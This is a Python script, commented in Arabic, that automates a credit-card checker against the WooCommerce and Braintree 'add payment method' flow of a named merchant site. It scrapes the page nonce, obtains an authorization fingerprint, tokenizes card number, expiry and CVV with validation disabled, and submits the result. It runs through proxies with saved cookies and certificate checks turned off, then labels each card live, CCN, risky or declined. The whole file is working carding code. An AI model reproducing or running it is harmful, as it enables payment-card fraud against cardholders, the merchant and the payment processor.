"""
بوابة الدفع: Braintree Auth Single
الموقع: mdbarnmaster.com
نوع البوابة: Braintree Auth Single (WooCommerce)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج woocommerce-add-payment-method-nonce
2. POST /wp-admin/admin-ajax.php -> الحصول على authorizationFingerprint
3. POST https://payments.braintree-api.com/graphql -> تحويل بيانات البطاقة إلى token
4. POST /my-account/add-payment-method/ -> إرسال البيانات النهائية والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_nonce(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب woocommerce-add-payment-method-nonce."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            "https://mdbarnmaster.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text1 = await r.text()

        nonce_match = re.search(
            r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text1
        )
        return nonce_match.group(1) if nonce_match else ""
    except Exception as e:
        raise RuntimeError(f"req1_get_nonce failed: {e}") from e


async def req2_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: الحصول على authorizationFingerprint عبر AJAX."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    data = {
        "action": "woocommerce_get_main_braintree_auth_fingerprint",
    }
    try:
        async with session.post(
            "https://mdbarnmaster.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res2 = await r.json(content_type=None)

        return res2.get("data", {}).get("authorizationFingerprint", "")
    except Exception as e:
        raise RuntimeError(f"req2_get_auth_fingerprint failed: {e}") from e


async def req3_tokenize_card(
    session: aiohttp.ClientSession,
    auth_fingerprint: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers_gql = {
        "authorization": f"Bearer {auth_fingerprint}",
        "content-type": "application/json",
        "braintree-version": "2018-05-10",
    }
    gql_query = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": (
            "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
            " tokenizeCreditCard(input: $input) {"
            " token creditCard { last4 brand } } }"
        ),
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers_gql,
            json=gql_query,
            proxy=proxy_url,
        ) as r:
            res3 = await r.json(content_type=None)

        tok = res3.get("data", {}).get("tokenizeCreditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Braintree tokenization returned empty token")
        return tok
    except Exception as e:
        raise RuntimeError(f"req3_tokenize_card failed: {e}") from e


async def req4_submit_payment(
    session: aiohttp.ClientSession,
    tok: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 4: إرسال وسيلة الدفع النهائية والحصول على نص الاستجابة."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    data4 = {
        "payment_method": "braintree_credit_card",
        "braintree_credit_card_nonce": tok,
        "woocommerce-add-payment-method-nonce": nonce,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "add_payment_method": "1",
    }
    try:
        async with session.post(
            "https://mdbarnmaster.com/my-account/add-payment-method/",
            headers=headers,
            data=data4,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req4_submit_payment failed: {e}") from e


async def process_B3_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree Auth Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("B3-2-Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            nonce = await req1_get_nonce(session, proxy_url)
            auth_fingerprint = await req2_get_auth_fingerprint(session, proxy_url)
            tok = await req3_tokenize_card(session, auth_fingerprint, cc, mes, ano, cvv, proxy_url)
            final_text = await req4_submit_payment(session, tok, nonce, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    responses = {
        "Success": ["Nice!", "Payment method successfully added.", "Approved"],
        "CCN": ["Card Identifier Failure", "Invalid security code", "Security code is incorrect"],
        "RISK": ["Risk", "Gateway Rejected: fraud", "Transaction declined - Help"],
    }

    status_icon = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    response_msg = "Your card was declined."

    if any(word in final_text for word in responses["Success"]):
        status_icon = "𝐀𝐮𝐭𝐡 ✅"
        response_msg = "Success"
    elif any(word in final_text for word in responses["CCN"]):
        status_icon = "𝐂𝐂𝐍 ♻️"
        response_msg = "CCN"
    elif any(word in final_text for word in responses["RISK"]):
        status_icon = "𝐑𝐢𝐬𝐤 ⚠️"
        response_msg = "Risk"
    else:
        error_match = re.search(
            r'class="woocommerce-error".*?>(.*?)</li>', final_text, re.S
        )
        if error_match:
            response_msg = re.sub(r"<.*?>", "", error_match.group(1)).strip()

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_msg
